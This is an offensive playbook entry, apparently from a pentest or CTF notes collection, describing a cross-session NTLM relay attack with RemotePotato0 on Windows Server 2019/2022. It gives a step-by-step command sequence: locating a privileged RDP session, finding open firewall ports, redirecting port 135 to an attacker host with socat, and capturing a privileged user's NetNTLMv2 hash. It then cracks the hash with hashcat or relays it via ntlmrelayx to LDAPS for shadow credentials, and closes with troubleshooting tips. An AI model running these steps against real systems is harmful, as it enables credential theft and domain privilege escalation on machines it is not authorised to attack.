# Cross-Session NTLM Relay (RemotePotato0)

## When this applies

- Foothold as a non-privileged user on a Windows DC/server (NETWORK logon via SSH, WinRM, etc.).
- Another (privileged) domain user has an INTERACTIVE session on the same host (RDP / console; visible as `explorer.exe` / `mstsc.exe` / `rdpclip.exe` in `Get-Process | Group-Object SessionId`).
- Windows Server 2019/2022 — JuicyPotato/RogueOxidResolver-on-127.0.0.1 is patched, but cross-session DCOM activation still works.
- Your account has at least `Certificate Service DCOM Access` (or `Distributed COM Users`).
- Goal: capture or relay the OTHER session's NTLM authentication without needing local admin.

## Technique

`StandardGetInstanceFromIStorage` lets you spawn a DCOM object inside the target session (`-s <session_id>`). When the spawned object resolves OXID it queries TCP/135 on whatever IP we tell it; we redirect that to a rogue OXID resolver that returns a binding for our RPC capture endpoint. The privileged user authenticates with NTLM and we capture (mode 2) or cross-protocol relay to HTTP (mode 0).

The 2019/2022 patch blocks running the rogue OXID on the same host (127.0.0.1) — solved by running the OXID resolver port (-p) somewhere reachable from session 1, redirected back from attacker:135 via `socat`.

## Steps

```bash
# 1. Find target session ID (from your shell on the box)
#    Use Get-Process Group-Object SessionId — the session with explorer/mstsc/rdpclip is the RDP'd user
#    qwinsta returns "No session exists" from a NETWORK logon; use RunasCs.exe -l 9 to get a Type 9 logon and run qwinsta
ssh user@target 'powershell -c "Get-Process | Group-Object SessionId | Format-Table"'

# 2. Discover Windows Firewall allowed inbound ports (DC blocks inbound except a few rules)
ssh user@target 'netsh advfirewall firewall show rule name=all | findstr /R "Custom\|Allow\|LocalPort"'
# Look for a "Custom TCP Allow" or similar rule with a non-RPC port range like 8000-9000.
# Pick a port from that range (call it $RP_PORT). RemotePotato0's rogue OXID will bind it on the box.

# 3. Upload RemotePotato0.exe to the box (https://github.com/antonioCoco/RemotePotato0/releases)
#    upload via SMB to user's profile: smbclient \\\\target\\users -> simon.watson\\Tools

# 4. Attacker side: socat 135 → box:$RP_PORT.
#    macOS allows non-root binding of TCP/135 (no sudo needed). On Linux you DO need sudo.
socat -d -d -v TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET_IP>:8888 &

# 5. Box side: launch RemotePotato0 in mode 2 (capture NETNTLMv2 hash)
ssh user@target 'C:\path\to\RemotePotato0.exe -m 2 -s 1 -x <ATTACKER_IP> -p 8888'
# Output:  
#   [+] Received the relayed authentication on the RPC relay server on port 9997
#   NTLMv2 Hash : Nigel.Mills::DOMAIN:<challenge>:<response>:<blob>

# 6. Crack with hashcat
hashcat -m 5600 nigel.netntlm rockyou.txt
```

## Mode 0 (cross-protocol relay) variant

Use mode 0 to relay the captured NTLM straight to LDAPS / SMB / HTTP without cracking.

```bash
# Attacker side: ntlmrelayx receives HTTP-NTLM the relay server unwrapped from the captured RPC auth
ntlmrelayx.py -t ldaps://DC --shadow-credentials --shadow-target nigel.mills --no-smb-server --http-port 80 -smb2support &
socat -d -d -v TCP-LISTEN:135,fork,reuseaddr TCP:<TARGET_IP>:8888 &
# Box side
ssh user@target 'RemotePotato0.exe -m 0 -r <ATTACKER_IP> -t 80 -s 1 -x <ATTACKER_IP> -p 8888'
```

LDAP relay won't always work due to LDAP signing requirements; SMB relay needs signing disabled. Capturing then cracking (mode 2) is the most reliable path on hardened DCs.

## Verifying success

- `[+] User hash stolen!` line in RemotePotato0 stdout — the next line is the NETNTLMv2 hash ready for `hashcat -m 5600`.
- If you see only `[*] ServerAlive2 RPC Call` followed by nothing, the chosen `-p` port isn't reachable from session 1 → wrong firewall port.

## Common pitfalls

- **`Trigger DCOM failed with status: 0x800706bf`** — `-p` port not open through Windows Firewall. Don't use 9999 or 9997 by default; enumerate firewall rules and pick a port in an allowed inbound range.
- **`RogueOxidResolver must be run remotely`** — this is informational on Server 2019+; the trick is `-x <attacker_IP>` + `socat 135 → box:<RP_PORT>`. Localhost OXID (127.0.0.1) is blocked.
- **`RpcServerUseProtseqEp() failed with status code 1740`** — informational, refers to one transport binding; the capture port still listens. Ignore unless ALL transports fail.
- **`Object SID mismatch`** when authenticating with the cert later — you need `-sid <target_SID>` on `certipy req` (or use `-extensionsid`); see `adcs-esc1.md`.
- **macOS port 135** — `nc -l 135` and `socat TCP-LISTEN:135` work without sudo because macOS doesn't restrict <1024 to root for unprivileged listeners over the user's own session. Confirm with `lsof -i :135` after starting socat.
- **Session 1 has no privileged user** — verify by checking explorer.exe / mstsc.exe / rdpclip.exe presence in session 1. If only `LogonUI` / `fontdrvhost` / `vm3dservice` are there, no one is logged in interactively yet — the attack will return SYSTEM hash from session 0 instead, or fail entirely.
- **OpenSSH on the box drops the session 1 token in a NETWORK logon (yours = session 0-ish)** — your SSH shell can't SEE session 1 directly, but DCOM activation across session works because RPCSS spawns the COM object server in the target session.

## Tools

- RemotePotato0 (`https://github.com/antonioCoco/RemotePotato0/releases`)
- socat (attacker side; macOS does not require sudo for port 135)
- ntlmrelayx (impacket) for mode-0 relay variant
- RunasCs (`https://github.com/antonioCoco/RunasCs`) — needed for Type 9 logon when `qwinsta` returns "No session exists"
